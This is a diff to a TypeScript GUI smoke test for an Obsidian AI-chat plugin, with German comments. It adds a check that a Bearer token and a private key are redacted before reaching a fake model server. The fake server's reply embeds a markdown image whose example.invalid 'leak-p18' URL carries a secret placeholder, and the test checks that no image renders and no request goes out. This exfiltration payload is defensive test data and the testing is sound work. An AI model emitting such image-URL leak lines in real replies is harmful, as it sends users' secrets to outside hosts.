@@ -1,5 +1,5 @@
 /**
- * GUI-Smoke — faehrt die Pruefpunkte P1-P17 gegen ein LAUFENDES Obsidian (CORE-TEST-02 b).
+ * GUI-Smoke — faehrt die Pruefpunkte P1-P18 gegen ein LAUFENDES Obsidian (CORE-TEST-02 b).
  *
  * Gemessen wird die SACHE: Dateiinhalt auf Platte (`sa-probe/data.json`, `hotkeys.json`, Schnappschuss-
  * Manifest), Dialogtext, Notice — nicht die Existenz eines Elements. Das Testplugin `sa-probe`
@@ -81,6 +81,7 @@ const PUNKTE = [
   "P15 Schluesselbund: Klartext-Schluessel der lokalen Endpunkt-Liste wandert aus der data.json, Header bleibt, Zeile zeigt „saved“",
   "P16 Roh-Block im Chat: unter dem Block ein „Raw block (secrets redacted)“ mit 🔒, nirgends der Schluessel; ungueltiges JSON wird nicht angezeigt",
   "P17 Neutralisierung: dataviewjs-Zaun, Inline-Code, img und javascript:-Link erzeugen im Chat kein code/pre/img und keinen Request",
+  "P18 Schwaerzung: Bearer-Token und PEM gehen als Platzhalter an den Server, die Antwort kommt im Original zurueck, ein Bild mit Platzhalter in der URL erzeugt kein img",
 ] as const;
 type PunktName = (typeof PUNKTE)[number];
 const pn = (prefix: string): PunktName => {
@@ -169,6 +170,11 @@ function antwortFuer(body: string): string {
   } catch { last = ""; }
   if (last.includes("SMOKE-RAW")) return RAW_ANSWER;
   if (last.includes("SMOKE-NEUTRAL")) return NEUTRAL_ANSWER;
+  if (last.includes("SMOKE-REDACT")) {
+    // Spiegelt die Platzhalter der Anfrage zurueck (so, wie ein Modell sie wiederholt) — samt einem Bild mit Platzhalter in der URL.
+    const ph = last.match(/\[redacted-[a-z0-9-]+-\d+\]/g) ?? [];
+    return `Echo: ${ph.join(" ")}\n\n![x](https://example.invalid/leak-p18?d=${ph[0] ?? ""})`;
+  }
   return CHAT_ANSWER;
 }
 
@@ -798,7 +804,7 @@ async function p8p12(c: Ctx): Promise<void> {
     const p = app.plugins.plugins[${q(PLUGIN_ID)}];
     p.settings.endpoints = [{ url: ${q(c.fake.url)}, apiKey: ${q(FAKE_ENDPOINT_KEY)}, model: ${q(FAKE_MODEL)} }];
     p.settings.endpointChoice = {}; p.settings.localModel = "";
-    p.cachedLocal = null;
+    p.llm.invalidate();
     await p.saveSettings();
     const ep = await p.resolveEndpoint();
     return { url: ep ? ep.url : null };
@@ -886,7 +892,7 @@ async function chatRunde(c: Ctx, frage: string): Promise<void> {
     const p = app.plugins.plugins[${q(PLUGIN_ID)}];
     p.settings.endpoints = [{ url: ${q(c.fake.url)}, apiKey: ${q(FAKE_ENDPOINT_KEY)}, model: ${q(FAKE_MODEL)} }];
     p.settings.endpointChoice = {}; p.settings.localModel = "";
-    p.cachedLocal = null;
+    p.llm.invalidate();
     await p.saveSettings();
     const ep = await p.resolveEndpoint();
     return { url: ep ? ep.url : null };
@@ -977,6 +983,47 @@ async function p17(c: Ctx): Promise<void> {
   const sichtbar = d.text.includes("ˋ") && d.text.includes("dataviewjs") && d.text.includes("$= dv.current()") && d.text.includes("<img src=https://example.invalid/x.png>") && d.text.includes("click");
   record(pn("P17"), d.code === 0 && d.preLang === 0 && d.active === 0 && linkOk && sichtbar && invalid.length === 0,
     `code-Elemente ${d.code}, pre/code mit language-Klasse ${d.preLang}, img/script/iframe/[src] ${d.active}, Links im Antworttext [${d.links.join("; ")}] (kein javascript: ${String(linkOk)}), Requests auf example.invalid ${invalid.length} (Messprobe sah ${String(mitschnittSieht)}; mitgeschnitten ${requests.length}) · Antwort als Text sichtbar (ˋ-Zeichen, Inline-Text, escaped <img>, Linktext): ${String(sichtbar)} · Dataview in der Zweitinstanz installiert: ${String(d.dataview)}${d.dataview ? "" : " — die Aussage ist daher nur „es entsteht kein code-/pre-Element, an dem ein Prozessor haengen koennte“, NICHT „Dataview fuehrt nichts aus“"}`);
+}
+
+
+const P18_TOKEN = "Bearer abcdefghijklmnop0123456789";
+const P18_PEM_BODY = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC";
+
+async function p18(c: Ctx): Promise<void> {
+  const requests: string[] = [];
+  await c.cdp.send("Network.enable");
+  c.cdp.on("Network.requestWillBeSent", (p) => { const u = (p as { request?: { url?: string } }).request?.url; if (u) requests.push(u); });
+  await c.cdp.evaluate(`
+    const probe = document.body.createEl("img", { attr: { src: "https://example.invalid/mess-probe-p18.png" } });
+    await new Promise((r) => setTimeout(r, 800));
+    probe.remove();
+    return { ok: true };
+  `);
+  const mitschnittSieht = requests.some((u) => u.includes("mess-probe-p18.png"));
+  const vor = c.fake.bodies.length;
+  await chatRunde(c, `SMOKE-REDACT please check ${P18_TOKEN} and -----BEGIN PRIVATE KEY----- ${P18_PEM_BODY} -----END PRIVATE KEY-----`);
+  const d = await c.cdp.evaluate<{ turn: number; text: string; imgs: number; active: number }>(`
+    const msgs = document.querySelector(".sa-chat-messages");
+    const turn = msgs.querySelector(".sa-chat-turn.is-assistant");
+    return {
+      turn: turn ? 1 : 0,
+      text: turn ? turn.textContent ?? "" : "",
+      imgs: msgs.querySelectorAll("img").length,
+      active: msgs.querySelectorAll("img, script, iframe, embed, object, video, audio, [src], [srcset]").length,
+    };
+  `);
+  const body = c.fake.bodies.slice(vor).join("\n");
+  if (body === "") { unmeasured(pn("P18"), "der Server hat keine Anfrage gesehen"); return; }
+  if (d.turn === 0) { unmeasured(pn("P18"), "die Chat-Antwort wurde nicht gerendert"); return; }
+  if (!mitschnittSieht) { unmeasured(pn("P18"), "der Netz-Mitschnitt sah nicht einmal den eigenen Mess-Request — „kein Request“ waere nichts wert"); return; }
+  const tokenOnWire = body.includes("abcdefghijklmnop0123456789");
+  const pemOnWire = body.includes(P18_PEM_BODY);
+  const placeholders = (body.match(/\[redacted-(?:token|private-key)-\d+\]/g) ?? []).length;
+  const tokenBack = d.text.includes(P18_TOKEN);
+  const pemBack = d.text.includes(P18_PEM_BODY);
+  const leak = requests.filter((u) => u.includes("leak-p18"));
+  record(pn("P18"), !tokenOnWire && !pemOnWire && placeholders >= 2 && tokenBack && pemBack && d.imgs === 0 && d.active === 0 && leak.length === 0,
+    `am Server: Token im Klartext ${String(tokenOnWire)}, PEM-Rumpf im Klartext ${String(pemOnWire)}, Platzhalter ${placeholders} · in der Antwort wieder da: Token ${String(tokenBack)}, PEM-Rumpf ${String(pemBack)} · img im Chat ${d.imgs}, aktive Elemente ${d.active}, Requests auf leak-p18 ${leak.length} (Messprobe sah ${String(mitschnittSieht)}; mitgeschnitten ${requests.length})`);
 }
 
 // ---------------------------------------------------------------------------------------------
@@ -1081,7 +1128,7 @@ async function main(): Promise<void> {
       const reihe: Array<[PunktName, (c: Ctx) => Promise<void>]> = [
         [pn("P1"), p1], [pn("P2"), p2], [pn("P13"), p13], [pn("P7"), p7], [pn("P14"), p14],
         [pn("P3"), p3], [pn("P4"), p4], [pn("P5"), p5], [pn("P11"), p11], [pn("P6"), p6],
-        [pn("P9"), p9], [pn("P10"), p10], [pn("P8"), p8p12], [pn("P15"), p15], [pn("P16"), p16], [pn("P17"), p17],
+        [pn("P9"), p9], [pn("P10"), p10], [pn("P8"), p8p12], [pn("P15"), p15], [pn("P16"), p16], [pn("P17"), p17], [pn("P18"), p18],
       ];
       for (const [name, fn] of reihe) {
         await schliesseDialoge(cdp);
